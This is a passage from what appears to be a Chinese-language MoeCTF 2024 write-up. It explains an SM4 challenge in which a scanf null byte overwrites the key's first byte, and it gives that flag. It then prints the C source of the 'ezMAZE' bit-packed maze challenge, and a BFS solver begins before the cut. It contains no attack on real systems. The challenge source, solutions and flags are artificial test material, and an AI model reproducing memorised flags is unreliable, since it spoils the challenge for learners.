class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>是从网上找到的SM4加密实现，但是程序在输入的时候，使用了scanf并且当你输入正确的flag长度的时候，最后一个是0字符截断，他会覆盖下一个变量的首字节，刚好下一个变量是key，所以key的首字节变成了0，导致很多人解不出来，其实只要输入一个正确长度的flag就可以进行解密。<br><code>moectf&#123;Congratulations_you_are_an_SM4_master!!!&#125;</code></p><h1 id="ezMAZE"><a href="#ezMAZE" class="headerlink" title="ezMAZE"></a>ezMAZE</h1><p>题目使用了OI常用技巧——状态压缩来存储迷宫，使用二进制的1和0代表是否可以通过。<br>题目源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">1177</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> theMaze[<span class="number">56</span>][<span class="number">10</span>] = &#123;</span><br><span class="line">        <span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,</span><br><span class="line">        <span class="number">0xbf</span>,<span class="number">0xff</span>,<span class="number">0xea</span>,<span class="number">0xa8</span>,<span class="number">0xa4</span>,<span class="number">0x92</span>,<span class="number">0x4f</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,</span><br><span class="line">        <span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x3d</span>,<span class="number">0x14</span>,<span class="number">0x94</span>,<span class="number">0x92</span>,<span class="number">0xb8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xff</span>,</span><br><span class="line">        <span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xbb</span>,<span class="number">0xda</span>,<span class="number">0x1f</span>,<span class="number">0x29</span>,<span class="number">0x7b</span>,<span class="number">0xff</span>,<span class="number">0xfe</span>,<span class="number">0xff</span>,</span><br><span class="line">        <span class="number">0xc0</span>,<span class="number">0x00</span>,<span class="number">0x3b</span>,<span class="number">0xda</span>,<span class="number">0xdc</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xff</span>,</span><br><span class="line">        <span class="number">0xdf</span>,<span class="number">0xff</span>,<span class="number">0xfb</span>,<span class="number">0xda</span>,<span class="number">0xdd</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0x7f</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,</span><br><span class="line">        <span class="number">0xc0</span>,<span class="number">0x00</span>,<span class="number">0x3b</span>,<span class="number">0xda</span>,<span class="number">0xdc</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xff</span>,</span><br><span class="line">        <span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xb8</span>,<span class="number">0x42</span>,<span class="number">0x1f</span>,<span class="number">0xff</span>,<span class="number">0xfb</span>,<span class="number">0xff</span>,<span class="number">0xfe</span>,<span class="number">0xff</span>,</span><br><span class="line">        <span class="number">0xc0</span>,<span class="number">0x00</span>,<span class="number">0x3f</span>,<span class="number">0xff</span>,<span class="number">0xfc</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xff</span>,</span><br><span class="line">        <span class="number">0xdf</span>,<span class="number">0xff</span>,<span class="number">0xf8</span>,<span class="number">0x7c</span>,<span class="number">0x3d</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0x7f</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,</span><br><span class="line">        <span class="number">0xc0</span>,<span class="number">0x00</span>,<span class="number">0x3b</span>,<span class="number">0xfd</span>,<span class="number">0xbc</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x00</span>,<span class="number">0x3e</span>,<span class="number">0x1f</span>,</span><br><span class="line">        <span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xb8</span>,<span class="number">0x7c</span>,<span class="number">0x7f</span>,<span class="number">0xff</span>,<span class="number">0xfb</span>,<span class="number">0xff</span>,<span class="number">0xbe</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xbf</span>,<span class="number">0x7d</span>,<span class="number">0xbd</span>,<span class="number">0x29</span>,<span class="number">0x7b</span>,<span class="number">0xff</span>,<span class="number">0xbe</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0x98</span>,<span class="number">0x7c</span>,<span class="number">0x3f</span>,<span class="number">0xff</span>,<span class="number">0xfb</span>,<span class="number">0xff</span>,<span class="number">0xbe</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0xff</span>,<span class="number">0xf8</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x3e</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xbf</span>,<span class="number">0x7f</span>,<span class="number">0x6f</span>,<span class="number">0xff</span>,<span class="number">0xfb</span>,<span class="number">0xff</span>,<span class="number">0xfe</span>,<span class="number">0xff</span>,<span class="number">0xfe</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0x96</span>,<span class="number">0xab</span>,<span class="number">0x60</span>,<span class="number">0x00</span>,<span class="number">0x08</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x01</span>,<span class="number">0xfe</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0x96</span>,<span class="number">0xab</span>,<span class="number">0x7f</span>,<span class="number">0xff</span>,<span class="number">0xef</span>,<span class="number">0xff</span>,<span class="number">0xfb</span>,<span class="number">0xfd</span>,<span class="number">0xfe</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0x95</span>,<span class="number">0x4b</span>,<span class="number">0x70</span>,<span class="number">0x00</span>,<span class="number">0x0c</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x01</span>,<span class="number">0xfe</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0x95</span>,<span class="number">0x4b</span>,<span class="number">0x77</span>,<span class="number">0xff</span>,<span class="number">0xfd</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0x7f</span>,<span class="number">0xfe</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xaa</span>,<span class="number">0x96</span>,<span class="number">0x70</span>,<span class="number">0x00</span>,<span class="number">0x0c</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x00</span>,<span class="number">0x06</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0x92</span>,<span class="number">0x57</span>,<span class="number">0x7f</span>,<span class="number">0xff</span>,<span class="number">0xef</span>,<span class="number">0xff</span>,<span class="number">0xfb</span>,<span class="number">0xff</span>,<span class="number">0xf6</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0x92</span>,<span class="number">0x94</span>,<span class="number">0x70</span>,<span class="number">0x00</span>,<span class="number">0x0c</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x00</span>,<span class="number">0x06</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0x8a</span>,<span class="number">0x4b</span>,<span class="number">0x77</span>,<span class="number">0xff</span>,<span class="number">0xfd</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0x7f</span>,<span class="number">0xfe</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xae</span>,<span class="number">0xd5</span>,<span class="number">0x70</span>,<span class="number">0x00</span>,<span class="number">0x0c</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x00</span>,<span class="number">0x0e</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0x95</span>,<span class="number">0x4a</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xef</span>,<span class="number">0xff</span>,<span class="number">0xfb</span>,<span class="number">0xff</span>,<span class="number">0xee</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0x8a</span>,<span class="number">0x4a</span>,<span class="number">0x4a</span>,<span class="number">0x50</span>,<span class="number">0xec</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0xff</span>,<span class="number">0xee</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xbf</span>,<span class="number">0x7f</span>,<span class="number">0x7f</span>,<span class="number">0xff</span>,<span class="number">0xe1</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xee</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xf5</span>,<span class="number">0x5d</span>,<span class="number">0x7f</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xee</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x38</span>,<span class="number">0xd5</span>,<span class="number">0x35</span>,<span class="number">0x2a</span>,<span class="number">0x98</span>,<span class="number">0x00</span>,<span class="number">0x0e</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xbf</span>,<span class="number">0xff</span>,<span class="number">0xbd</span>,<span class="number">0x51</span>,<span class="number">0x2f</span>,<span class="number">0xff</span>,<span class="number">0xfb</span>,<span class="number">0xff</span>,<span class="number">0xfe</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xa0</span>,<span class="number">0x00</span>,<span class="number">0x3f</span>,<span class="number">0xff</span>,<span class="number">0xfc</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xaf</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xc0</span>,<span class="number">0x7d</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0x7f</span>,<span class="number">0xff</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xa0</span>,<span class="number">0x00</span>,<span class="number">0x3f</span>,<span class="number">0xdf</span>,<span class="number">0x7c</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xbf</span>,<span class="number">0xff</span>,<span class="number">0xbf</span>,<span class="number">0xdf</span>,<span class="number">0x7f</span>,<span class="number">0xff</span>,<span class="number">0xfb</span>,<span class="number">0xff</span>,<span class="number">0xfe</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xa0</span>,<span class="number">0x00</span>,<span class="number">0x3f</span>,<span class="number">0xdf</span>,<span class="number">0x7c</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xaf</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xdf</span>,<span class="number">0x7d</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0x7f</span>,<span class="number">0xff</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xa0</span>,<span class="number">0x00</span>,<span class="number">0x3f</span>,<span class="number">0xdf</span>,<span class="number">0x7c</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xbf</span>,<span class="number">0xff</span>,<span class="number">0xbf</span>,<span class="number">0xdf</span>,<span class="number">0x7f</span>,<span class="number">0xff</span>,<span class="number">0xfb</span>,<span class="number">0xff</span>,<span class="number">0xfe</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xbc</span>,<span class="number">0x8b</span>,<span class="number">0xbf</span>,<span class="number">0xdf</span>,<span class="number">0x7f</span>,<span class="number">0xff</span>,<span class="number">0xfb</span>,<span class="number">0xff</span>,<span class="number">0xfe</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xa9</span>,<span class="number">0x24</span>,<span class="number">0x9f</span>,<span class="number">0xdf</span>,<span class="number">0x7f</span>,<span class="number">0xff</span>,<span class="number">0xfb</span>,<span class="number">0xff</span>,<span class="number">0xfe</span>,<span class="number">0x5f</span>,</span><br><span class="line">        <span class="number">0xb2</span>,<span class="number">0xa1</span>,<span class="number">0xcf</span>,<span class="number">0xdf</span>,<span class="number">0x78</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x5f</span>,</span><br><span class="line">        <span class="number">0xb1</span>,<span class="number">0x52</span>,<span class="number">0xef</span>,<span class="number">0xdf</span>,<span class="number">0xfb</span>,<span class="number">0xff</span>,<span class="number">0xfe</span>,<span class="number">0xff</span>,<span class="number">0xfb</span>,<span class="number">0x5f</span>,</span><br><span class="line">        <span class="number">0xaa</span>,<span class="number">0x22</span>,<span class="number">0xe0</span>,<span class="number">0x00</span>,<span class="number">0x08</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x01</span>,<span class="number">0xf8</span>,<span class="number">0x5f</span>,</span><br><span class="line">        <span class="number">0xbd</span>,<span class="number">0x29</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xef</span>,<span class="number">0xff</span>,<span class="number">0xfb</span>,<span class="number">0xfd</span>,<span class="number">0xff</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xb2</span>,<span class="number">0x52</span>,<span class="number">0xb0</span>,<span class="number">0x00</span>,<span class="number">0x0c</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x01</span>,<span class="number">0xff</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xb4</span>,<span class="number">0x94</span>,<span class="number">0xb7</span>,<span class="number">0xff</span>,<span class="number">0xfd</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0x7f</span>,<span class="number">0xff</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xb2</span>,<span class="number">0x4a</span>,<span class="number">0xb0</span>,<span class="number">0x00</span>,<span class="number">0x0c</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xb2</span>,<span class="number">0x52</span>,<span class="number">0x5f</span>,<span class="number">0xff</span>,<span class="number">0xef</span>,<span class="number">0xff</span>,<span class="number">0xfb</span>,<span class="number">0xff</span>,<span class="number">0xfe</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xb2</span>,<span class="number">0x54</span>,<span class="number">0xd0</span>,<span class="number">0x00</span>,<span class="number">0x0c</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xb2</span>,<span class="number">0x52</span>,<span class="number">0x57</span>,<span class="number">0xff</span>,<span class="number">0xfd</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0x7f</span>,<span class="number">0xff</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xb2</span>,<span class="number">0x91</span>,<span class="number">0x30</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x0f</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xb0</span>,<span class="number">0x89</span>,<span class="number">0x7f</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xf8</span>,<span class="number">0x7f</span>,<span class="number">0xfe</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0xbc</span>,<span class="number">0x91</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xe0</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0xff</span>,<span class="number">0xfe</span>,<span class="number">0xdf</span>,</span><br><span class="line">        <span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x0d</span>,<span class="number">0xff</span>,<span class="number">0xfe</span>,<span class="number">0x94</span>,<span class="number">0x8a</span>,<span class="number">0x5f</span>,</span><br><span class="line">        <span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">checkForMaze</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> val;</span><br><span class="line">        <span class="comment">// 1 means cannot pass.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (x &gt; <span class="number">10</span> * <span class="number">8</span> || y &gt; <span class="number">56</span> || x &lt; <span class="number">1</span> || y &lt; <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        val = theMaze[y - <span class="number">1</span>][(x - <span class="number">1</span>) / <span class="number">8</span>];</span><br><span class="line">        theMaze[y - <span class="number">1</span>][(x - <span class="number">1</span>) / <span class="number">8</span>] = val | (<span class="number">1</span> &lt;&lt; (<span class="number">7</span> - ((x - <span class="number">1</span>) % <span class="number">8</span>)));</span><br><span class="line">        <span class="keyword">return</span> ((val &gt;&gt; (<span class="number">7</span> - ((x - <span class="number">1</span>) % <span class="number">8</span>))) &amp; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">calculateFlag</span><span class="params">(<span class="type">char</span>* buf)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> sumOf;</span><br><span class="line">        <span class="type">char</span>* flag;</span><br><span class="line">        flag = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">        memcpy_s(flag, <span class="number">40</span>, <span class="string">&quot;moectf&#123;&quot;</span>, <span class="number">7</span>);</span><br><span class="line">        sumOf = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1176</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                sumOf += (buf[i] * <span class="number">3113131</span> * i + i * i + <span class="number">0x114514</span>) &amp; <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">snprintf</span>(flag + <span class="number">7</span>, <span class="number">128</span> - <span class="number">8</span>, <span class="string">&quot;the_%llu_amazing_maze!!&#125;&quot;</span>, sumOf);</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span>* result;</span><br><span class="line">        <span class="type">int</span> x, y, i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;M0EC7F-2024 ezMaze\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ohno I&#x27;v stuck in a M4Z3... h3lp me (use w,a,s,d)\n&quot;</span>);</span><br><span class="line">        x = <span class="number">2</span>;</span><br><span class="line">        y = <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;please input the path sequence...\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!scanf_s(<span class="string">&quot;%1177s&quot;</span>, buf, <span class="number">1177</span>))</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;input err.\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\rx =%3d, y =%3d&quot;</span>, x, y);</span><br><span class="line">                <span class="keyword">if</span> (x == <span class="number">75</span> &amp;&amp; y == <span class="number">55</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;\n%s\n&quot;</span>, buf);</span><br><span class="line">                        result = calculateFlag(buf);</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;\nYOU WIN!!! the flag is %s\n&quot;</span>, result);</span><br><span class="line">                        <span class="built_in">free</span>(result);</span><br><span class="line">                        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!buf[i])</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;\nmission failed..\n&quot;</span>);</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">switch</span> (buf[i++])</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> (y &gt; <span class="number">1</span> &amp;&amp; !checkForMaze(x, y - <span class="number">1</span>)) y -= <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;You cannot walk the same path!!\n&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> (y &lt; <span class="number">56</span> &amp;&amp; !checkForMaze(x, y + <span class="number">1</span>)) y += <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;You cannot walk the same path!!\n&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> (x &gt; <span class="number">1</span> &amp;&amp; !checkForMaze(x - <span class="number">1</span>, y)) x -= <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;You cannot walk the same path!!\n&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> (x &lt; <span class="number">10</span> * <span class="number">8</span> &amp;&amp; !checkForMaze(x + <span class="number">1</span>, y)) x += <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;You cannot walk the same path!!\n&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;you can only input w,a,s,d\n&quot;</span>);</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>WP:<br>其一（抄出来，bfs）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_wall</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> temp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (x &gt; <span class="number">80</span> || y &gt; <span class="number">56</span> || x &lt; <span class="number">1</span> || y &lt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">temp = maze[<span class="number">10</span> * y - <span 